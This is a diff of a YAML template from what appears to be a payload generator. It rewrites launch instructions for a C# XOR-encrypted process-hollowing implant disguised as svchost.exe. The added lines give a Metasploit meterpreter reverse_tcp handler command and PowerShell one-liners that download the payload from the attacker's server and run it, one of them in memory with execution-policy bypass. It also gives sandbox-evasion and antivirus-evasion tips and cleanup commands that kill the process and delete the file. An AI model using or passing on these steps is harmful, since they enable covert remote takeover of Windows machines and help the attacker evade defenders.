@@ -98,74 +98,41 @@ output:
   launch_instructions: |
     C# XOR Process Hollowing - Launch Instructions
 
-    Step 1: Start Metasploit Listener
-
-    Start msfconsole and configure the handler:
-
+    Start Listener:
     msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
-    Or manually in msfconsole:
-
-    use exploit/multi/handler
-    set payload windows/x64/meterpreter/reverse_tcp
-    set LHOST {{ lhost }}
-    set LPORT {{ lport }}
-    set ExitOnSession false
-    exploit -j
-
-    Step 2: Transfer Payload to Target
-
-    Transfer the generated executable to the target Windows system:
-
-    Using Python HTTP server:
+    Transfer and Execute:
     python3 -m http.server 8080
+    On target: powershell -c "IWR -Uri http://{{ lhost }}:8080/{{ output_file }} -OutFile {{ output_file }}; Start-Process {{ output_file }}"
 
-    On target (PowerShell):
-    Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
-
-    Step 3: Execute on Target
-
-    Simply run the executable:
-    {{ output_file }}
-
-    Or via PowerShell:
-    Start-Process {{ output_file }}
-
-    Step 4: Verify Connection
-
-    Check your Metasploit console for incoming session:
-    Sending stage (200262 bytes) to [target_ip]
-    Meterpreter session 1 opened
+    In-Memory Execution:
+    python3 -m http.server 8080
+    On target: powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}:8080/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [ProcessHollowing.Program]::Main(@())"
 
     Notes:
-
-    - Encrypted with XOR key 0x{{ xor_key }}
-    - Includes 10-second sleep for sandbox evasion
-    - Spawns svchost.exe in suspended state (CREATE_SUSPENDED)
-    - Parses PEB to locate executable entrypoint
-    - Overwrites entrypoint with decoded shellcode
+    - XOR encrypted with key: 0x{{ xor_key }}
+    - 10-second sleep for sandbox evasion (sandboxes often skip delays)
+    - Spawns C:\Windows\System32\svchost.exe in suspended state (CREATE_SUSPENDED flag)
+    - Parses PEB (Process Environment Block) to locate executable entrypoint
+    - Overwrites entrypoint with XOR-decoded shellcode via WriteProcessMemory
     - Resumes thread to execute payload
-    - Process appears as legitimate svchost.exe
+    - Process appears as legitimate svchost.exe in process list
     - Requires x64 Windows system
-
-    How It Works:
-
-    1. Sleep 10 seconds to evade sandboxes that skip delays
-    2. Spawn C:\Windows\System32\svchost.exe in suspended state
-    3. Query process PEB (Process Environment Block) via ZwQueryInformationProcess
-    4. Read PEB to get base executable address
-    5. Parse PE header to find e_lfanew offset
-    6. Calculate RVA (Relative Virtual Address) of entrypoint
-    7. Get absolute entrypoint address
-    8. XOR-decode shellcode
-    9. Overwrite entrypoint with shellcode using WriteProcessMemory
-    10. Resume thread with ResumeThread
-    11. Shellcode executes as svchost.exe process
+    - More evasive than direct injection (no CreateRemoteThread)
+    - Technique: ZwQueryInformationProcess → Read PEB → Parse PE → Get entrypoint → Overwrite → Resume
 
     Troubleshooting:
+    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
+    - AV blocks: XOR weak; consider AES, additional obfuscation, or packing
+    - Process crashes: Shellcode may be incompatible; verify x64 Meterpreter
+    - Immediate termination: AV killed process; check Defender logs
+    - Svchost.exe spawns then dies: Entrypoint overwrite may have failed; check PEB parsing
+    - Sysmon Event ID 1 (process creation) and Event ID 25 (process tampering) may fire
 
-    - If no connection: Check firewall rules on attacker machine
-    - If AV blocks: Consider additional obfuscation or packing
+    Cleanup:
+    On target:
+    taskkill /F /IM svchost.exe /FI "PID eq [PID]" 2>nul
+    del {{ output_file }}
     - Payload waits 10 seconds before execution (sandbox evasion)
     - Requires x64 Windows system
     - svchost.exe must exist at C:\Windows\System32\svchost.exe
